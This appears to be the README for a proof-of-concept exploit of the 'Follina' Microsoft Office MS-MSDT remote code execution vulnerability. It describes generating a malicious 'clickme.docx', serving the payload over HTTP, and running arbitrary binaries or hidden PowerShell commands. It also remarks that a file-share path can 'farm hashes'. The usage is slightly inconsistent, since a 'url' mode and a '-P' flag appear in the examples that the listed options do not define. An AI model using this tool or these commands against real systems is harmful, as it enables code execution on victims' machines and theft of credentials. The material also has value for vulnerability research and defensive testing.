# 'Follina' MS-MSDT n-day Microsoft Office RCE

Quick POC to replicate the 'Follina' Office RCE vulnerability for local testing purposes. Running the script will generate the `clickme.docx` payload file in your current working directory, and start a web server with the payload file (`www/exploit.html`). The payload and web server parameters are configurable (see examples).

> ⚠ DO NOT USE IN PRODUCTION LEST YOU BE REGARDED A DUMMY

## Usage:

```
python .\follina.py -h
usage: follina.py [-h] -m {command,binary} [-b BINARY] [-c COMMAND] [-u URL] [-H HOST] [-p PORT]

options:
  -h, --help            show this help message and exit

Required Arguments:
  -m {command,binary}, --mode {command,binary}
                        Execution mode, can be "binary" to load a (remote) binary, or "command" to run an encoded PS command

Binary Execution Arguments:
  -b BINARY, --binary BINARY

Command Execution Arguments:
  -c COMMAND, --command COMMAND
                        The encoded command to execute in "command" mode

Optional Arguments:
  -u URL, --url URL     The hostname or IP address where the generated document should retrieve your payload, defaults to "localhost"
  -H HOST, --host HOST  The interface for the web server to listen on, defaults to all interfaces (0.0.0.0)
  -p PORT, --port PORT  The port to run the HTTP server on, defaults to 80
```

## Examples:

```
# Execute a local binary
python .\follina.py -m binary -b \windows\system32\calc.exe

# Execute a binary from a file share (can be used to farm hashes 👀)
python .\follina.py -m binary -b \\localhost\c$\windows\system32\calc.exe

# Execute an arbitrary powershell command
python .\follina.py -m command -c "Start-Process c:\windows\system32\cmd.exe -WindowStyle hidden -ArgumentList '/c echo owned > c:\users\public\owned.txt'"

# Create the malicious document with a custom payload URL, no webserver
python .\follina.py -m url -u http://example.com/payload.html

# Only run the webserver on localhost, on port 8080 instead of 80
python .\follina.py -m binary -b \windows\system32\calc.exe -H 127.0.0.1 -P 8080

```

## Cool peeps

Thanks to [Kevin Beaumont](https://twitter.com/GossiTheDog) for [his original analysis](https://doublepulsar.com/follina-a-microsoft-office-code-execution-vulnerability-1a47fce5629e) of the issue, [@KevTheHermit](https://twitter.com/KevTheHermit) for sharing their poc, and [John Hammond](https://twitter.com/_JohnHammond) for their further work on analysing payload requirements. Additional thanks to [@mkolsek](https://twitter.com/mkolsek) for the template [supporting Office 2019](https://twitter.com/mkolsek/status/1531217733546823681), and [@theluemmel](https://twitter.com/theluemmel) for sharing their version of the payload with me.